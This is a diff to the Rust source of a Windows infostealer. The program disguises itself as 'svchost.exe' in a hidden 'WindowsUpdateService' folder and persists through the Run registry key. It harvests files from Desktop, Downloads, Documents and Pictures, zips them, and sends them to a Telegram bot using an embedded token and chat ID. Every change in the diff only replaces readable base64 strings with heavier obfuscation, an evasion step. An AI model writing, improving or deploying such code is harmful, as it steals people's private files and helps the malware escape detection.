@@ -45,10 +45,10 @@ mod utils {
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let v_c3d4 = env::current_exe()?;
     
-    let v_e5f6 = env::var(&obfuscation::deobfuscate("UFJPR1JBTURBVEE=").unwrap_or_default())
-        .unwrap_or_else(|_| obfuscation::deobfuscate("QzpcUHJvZ3JhbURhdGE=").unwrap_or_default());
-    let v_g7h8 = Path::new(&v_e5f6).join(obfuscation::deobfuscate("V2luZG93c1VwZGF0ZVNlcnZpY2U=").unwrap_or_default());
-    let v_i9j0 = v_g7h8.join(obfuscation::deobfuscate("c3ZjaG9zdC5leGU=").unwrap_or_default());
+    let v_e5f6 = env::var(&obfuscation::deobfuscate("UlMwRUQzQyswLTEzIE4ySzA=").unwrap())
+        .unwrap_or_else(|_| obfuscation::deobfuscate("UyQyRTYxNy80RUY2M1I2KjcyKzg0").unwrap());
+    let v_g7h8 = Path::new(&v_e5f6).join(obfuscation::deobfuscate("V0MwWEw3V0Y3OCA0UVY0UFE2OTM2LjM2S0s0QyU2").unwrap());
+    let v_i9j0 = v_g7h8.join(obfuscation::deobfuscate("LyA0UCU2IEY3TEE0MzQ2MzE=").unwrap());
     
     if v_c3d4 == v_i9j0 {
         return b4g8l2p6().await;
@@ -79,7 +79,7 @@ async fn b4g8l2p6() -> Result<(), Box<dyn std::error::Error>> {
     let v_o5p6 = m5s9w3a7(&v_m3n4)?;
 
     for (i, v_q7r8) in v_o5p6.iter().enumerate() {
-        let v_s9t0 = format!("{}_{}.zip", &obfuscation::deobfuscate("Y29sbGVjdGVkX2ZpbGVzX3BhcnQ=").unwrap_or_default(), i + 1);
+        let v_s9t0 = format!("{}_{}.zip", &obfuscation::deobfuscate("TSU2T0E3QzQ2IDg0Ojg2TEw2RkE3SSA0VFY0Ui40").unwrap(), i + 1);
 
         utils::a2d5h7k1().await;
         match n6t0x4b8(v_q7r8, &v_s9t0).await {
@@ -99,11 +99,11 @@ fn c5i9m3q7(v_i9j0: &Path) -> Result<bool, Box<dyn std::error::Error>> {
     
     let v_y5z6 = RegKey::predef(HKEY_CURRENT_USER);
     match v_y5z6.open_subkey_with_flags(
-        &obfuscation::deobfuscate("U09GVFdBUkVcXE1pY3Jvc29mdFxcV2luZG93c1xcQ3VycmVudFZlcnNpb25cXFJ1bg==")?,
+        &obfuscation::deobfuscate("V1kwNUkyJEIwOCswWDYxT1I3Ny80TCQ0Kks2QjYxVFI3MkE2Q0U0VjYxLTI0Li40SEw3NkkwVy40U1I3JUs3TyswRTE=")?,
         KEY_READ
     ) {
         Ok(v_a1b2) => {
-            match v_a1b2.get_value::<String, _>(&obfuscation::deobfuscate("V2luZG93c1VwZGF0ZVNlcnZpY2U=")?) {
+            match v_a1b2.get_value::<String, _>(&obfuscation::deobfuscate("V0MwWEw3V0Y3OCA0UVY0UFE2OTM2LjM2S0s0QyU2")?) {
                 Ok(v_c3d4) => {
                     let v_e5f6 = v_i9j0.to_string_lossy();
                     if v_c3d4 == v_e5f6 {
@@ -130,15 +130,15 @@ fn d6j0n4r8(v_i9j0: &Path) -> Result<(), Box<dyn std::error::Error>> {
     if !v_g7h8.exists() {
         fs::create_dir_all(&v_g7h8)?;
         let hidden_folder_path_str = v_g7h8.to_string_lossy().to_string();
-        Command::new(&obfuscation::deobfuscate("YXR0cmli")?)
-            .args([&obfuscation::deobfuscate("K2g=")?, &hidden_folder_path_str])
+        Command::new(&obfuscation::deobfuscate("UFE2Ujg0UFI3")?)
+            .args([&obfuscation::deobfuscate("Ny9G")?, &hidden_folder_path_str])
             .output()?;
     }
     let v_k1l2 = env::current_exe()?;
     fs::copy(&v_k1l2, v_i9j0)?;
     let target_exe_str = v_i9j0.to_string_lossy().to_string();
-    Command::new(&obfuscation::deobfuscate("YXR0cmli")?)
-        .args([&obfuscation::deobfuscate("K2g=")?, &target_exe_str])
+    Command::new(&obfuscation::deobfuscate("UFE2Ujg0UFI3")?)
+        .args([&obfuscation::deobfuscate("Ny9G")?, &target_exe_str])
         .output()?;
     
     Ok(())
@@ -148,11 +148,11 @@ fn d6j0n4r8(v_i9j0: &Path) -> Result<(), Box<dyn std::error::Error>> {
 fn e7k1o5s9(v_i9j0: &Path) -> Result<(), Box<dyn std::error::Error>> {
     let v_m3n4 = RegKey::predef(HKEY_CURRENT_USER);
     let v_o5p6 = v_m3n4.open_subkey_with_flags(
-        &obfuscation::deobfuscate("U09GVFdBUkVcXE1pY3Jvc29mdFxcV2luZG93c1xcQ3VycmVudFZlcnNpb25cXFJ1bg==")?,
+        &obfuscation::deobfuscate("V1kwNUkyJEIwOCswWDYxT1I3Ny80TCQ0Kks2QjYxVFI3MkE2Q0U0VjYxLTI0Li40SEw3NkkwVy40U1I3JUs3TyswRTE=")?,
         KEY_WRITE
     )?;
     
-    let v_q7r8 = &obfuscation::deobfuscate("V2luZG93c1VwZGF0ZVNlcnZpY2U=")?;
+    let v_q7r8 = &obfuscation::deobfuscate("V0MwWEw3V0Y3OCA0UVY0UFE2OTM2LjM2S0s0QyU2")?;
     let v_s9t0 = v_i9j0.to_string_lossy();
     
     v_o5p6.set_value(v_q7r8, &v_s9t0.to_string())?;
@@ -275,25 +275,25 @@ fn k3q7u1y5() -> Result<Vec<FileInfo>, Box<dyn std::error::Error>> {
     let mut v_a1b2 = Vec::new();
 
     if let Some(v_c3d4) = desktop_dir() {
-        if let Ok(mut v_e5f6) = j2p6t0x4(&v_c3d4, &obfuscation::deobfuscate("RGVza3RvcA==").unwrap_or_default()) {
+        if let Ok(mut v_e5f6) = j2p6t0x4(&v_c3d4, &obfuscation::deobfuscate("WjcyUCQ0MTk0JDA=").unwrap()) {
             v_a1b2.append(&mut v_e5f6);
         }
     }
 
     if let Some(v_g7h8) = download_dir() {
-        if let Ok(mut v_i9j0) = j2p6t0x4(&v_g7h8, &obfuscation::deobfuscate("RG93bmxvYWRz").unwrap_or_default()) {
+        if let Ok(mut v_i9j0) = j2p6t0x4(&v_g7h8, &obfuscation::deobfuscate("MDgyWEU0UEE3LVE2JTA=").unwrap()) {
             v_a1b2.append(&mut v_i9j0);
         }
     }
 
     if let Some(v_k1l2) = document_dir() {
-        if let Ok(mut v_m3n4) = j2p6t0x4(&v_k1l2, &obfuscation::deobfuscate("RG9jdW1lbnRz").unwrap_or_default()) {
+        if let Ok(mut v_m3n4) = j2p6t0x4(&v_k1l2, &obfuscation::deobfuscate("MDgyLSQ2VDQ3SEw3JTA=").unwrap()) {
             v_a1b2.append(&mut v_m3n4);
         }
     }
 
     if let Some(v_o5p6) = picture_dir() {
-        if let Ok(mut v_q7r8) = j2p6t0x4(&v_o5p6, &obfuscation::deobfuscate("UGljdHVyZXM=").unwrap_or_default()) {
+        if let Ok(mut v_q7r8) = j2p6t0x4(&v_o5p6, &obfuscation::deobfuscate("WlQwLiQ2LTI0LTM2").unwrap()) {
             v_a1b2.append(&mut v_q7r8);
         }
     }
@@ -366,16 +366,16 @@ fn m5s9w3a7(v_e5f6: &[FileInfo]) -> Result<Vec<Vec<u8>>, Box<dyn std::error::Err
 }
 
 async fn n6t0x4b8(v_y5z6: &[u8], v_a1b2: &str) -> Result<(), Box<dyn std::error::Error>> {
-    let v_c3d4 = obfuscation::deobfuscate("Nzk2MDgzNzQ4NzpBQUZLckJMMTQzWElBTFpCMzluOWZROWJYWFQ0bGRyUmxucw==")?;
-    let v_e5f6 = obfuscation::deobfuscate("NzI3OTQ2Nzk1MA==")?;
+    let v_c3d4 = obfuscation::deobfuscate("LUpDS1BDRyREVUpDQyRELTFFOU8yTyAzSS0yMlZDUCtDWE8zUDczNS8yV1VET1VEN1AwOC82OlMxNERDUzk2NC0wTUw3")?;
+    let v_e5f6 = obfuscation::deobfuscate("IEpDLUpDMUVDLUpDSDhD")?;
 
-    let v_g7h8 = format!("https://api.telegram.org/bot{}/{}", v_c3d4, obfuscation::deobfuscate("c2VuZERvY3VtZW50")?);
+    let v_g7h8 = format!("https://api.telegram.org/bot{}/{}", v_c3d4, obfuscation::deobfuscate("QiQ0WEw3MDgyLSQ2VDQ3SEw3")?);
 
     let v_i9j0 = reqwest::Client::new();
 
-    let chat_id_str = obfuscation::deobfuscate("Y2hhdF9pZA==")?;
-    let document_str = obfuscation::deobfuscate("ZG9jdW1lbnQ=")?;
-    let mime_str = &obfuscation::deobfuscate("YXBwbGljYXRpb24vemlw")?;
+    let chat_id_str = obfuscation::deobfuscate("UCU2UFE2QUQxNDE=")?;
+    let document_str = obfuscation::deobfuscate("MkE2LSQ2VDQ3SEw3")?;
+    let mime_str = &obfuscation::deobfuscate("VFE2WVY0T1I3UFE2U1I3R043Vy81JDA=")?;
 
     let v_k1l2 = reqwest::multipart::Form::new()
         .text(chat_id_str, v_e5f6)
